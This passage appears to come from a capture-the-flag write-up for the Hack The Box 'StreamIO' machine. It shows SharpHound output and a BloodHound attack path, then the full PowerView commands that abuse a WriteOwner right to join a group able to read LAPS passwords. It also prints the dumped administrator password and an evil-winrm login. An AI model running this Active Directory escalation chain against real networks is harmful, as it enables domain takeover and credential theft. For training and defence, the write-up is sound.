2022-07-29T23:35:16.1106010-07:00|INFORMATION|Initializing SharpHound at 11:35 PM on 7/29/2022
2022-07-29T23:35:16.2980659-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-29T23:35:16.4699508-07:00|INFORMATION|Beginning LDAP search for streamIO.htb
2022-07-29T23:35:16.5012185-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-07-29T23:35:16.5012185-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-07-29T23:35:47.1823776-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2022-07-29T23:36:06.1964563-07:00|INFORMATION|Consumers finished, closing output channel
2022-07-29T23:36:06.2277058-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-07-29T23:36:06.4777324-07:00|INFORMATION|Status: 97 objects finished (+97 1.94)/s -- Using 40 MB RAM
2022-07-29T23:36:06.4777324-07:00|INFORMATION|Enumeration finished in 00:00:50.0253494
2022-07-29T23:36:06.6027039-07:00|INFORMATION|SharpHound Enumeration Completed at 11:36 PM on 7/29/2022! Happy Graphing!
```

To get BloodHound setup, you can [follow this guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux). Then, just download the zip file ([20220729233606_BloodHound.zip](20220729233606_BloodHound.zip)) from the machine and drag and drop it onto the BloodHound interface. Then, on the Analysis tab, choose "Shortest Paths to High Value Targets."

![](screenshots/graph.png)

The important part is this region:

![](screenshots/graph_zoom.png)

From this graph, we can see that the `JDgodd` user has `WriteOwner` permissions on the `CORE_STAFF` group, and that group has the ability to read the LAPS password.

According to [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#laps), "LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES."

According to [HackTrick's Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#writeowner-on-group), "Some of the Active Directory object permissions and types that we as attackers are interested in: WriteOwner - change object owner to attacker controlled user take over the object." [This page](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit) is also helpful: "Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc). The WriteOwner permission can be abused by an attacker to change the object owner to an attacker controlled user and take over the object."

Additionally, according to [this article about WriteOwner](https://docs.tenable.com/tenablead/3_x/Content/User/AttackPath/WriteOwner.htm), "The Source security principal has the permission to change the owner of the Target object, including assigning themselves as the owner. Owners have implicit rights, "Read Control" and "Write DACL", that allow them to obtain additional rights for themselves or for someone else, and ultimately compromise the Target object."

So, the attack idea is to add `JDgodd` to the `CORE_STAFF` using the `JDgodd` user, since he owns that group but is not yet a member of it. Once `JDgodd` is in the `CORE_STAFF` group, they will be able to read the LAPS password and we can use that to get Administrator.

We will use [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to simplify the commands. Upload it to the target and import it with `Import-Module .\PowerView.ps1`. We follow [this guide](https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object/) to create the PSCredential object. Documentation for commands: [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/), [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/), and [Get-ADComputer](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer?view=windowsserver2022-ps).

```powershell
# Define clear text string for username and password
[string]$userName = 'STREAMIO\JDgodd'
[string]$userPassword = 'JDg0dd1s@d0p3cr3@t0r'
# Convert to SecureString
[securestring]$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
# Create PSCredential
[pscredential]$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)

# Give JDgodd all rights on the "Core Staff" group
Add-DomainObjectAcl -TargetIdentity "Core Staff" -PrincipalIdentity $userName -Rights All -Credential $credObject
# Add JDgodd as a member of the "Core Staff" group
Add-DomainGroupMember -Identity "Core Staff" -Members "STREAMIO\JDgodd" -Credential $credObject
# Dump the LAPS password as JDgodd
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime -Credential $credObject
```

(By the way, the last command is from my [Timelapse machine writeup](../Timelapse/README.md))

This produces the following:

```
DistinguishedName           : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName                 : DC.streamIO.htb
Enabled                     : True
ms-Mcs-AdmPwd               : c5LUR48;CYA8Y1
ms-Mcs-AdmPwdExpirationTime : 133037099027928466
Name                        : DC
ObjectClass                 : computer
ObjectGUID                  : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName              : DC$
SID                         : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName           :
```

With the local Administrator password `c5LUR48;CYA8Y1`, we can use evil-winrm to connect as the Adminstrator: `evil-winrm -u Administrator -p "c5LUR48;CYA8Y1" -i streamio.htb`.

The `root.txt` flag is not located at `C:\Users\Administrator\Desktop\root.txt`, but we remember from before that there is another admin called `Martin`. Sure enough we get the `root.txt` flag with `cat C:\Users\Martin\Desktop\root.txt`.

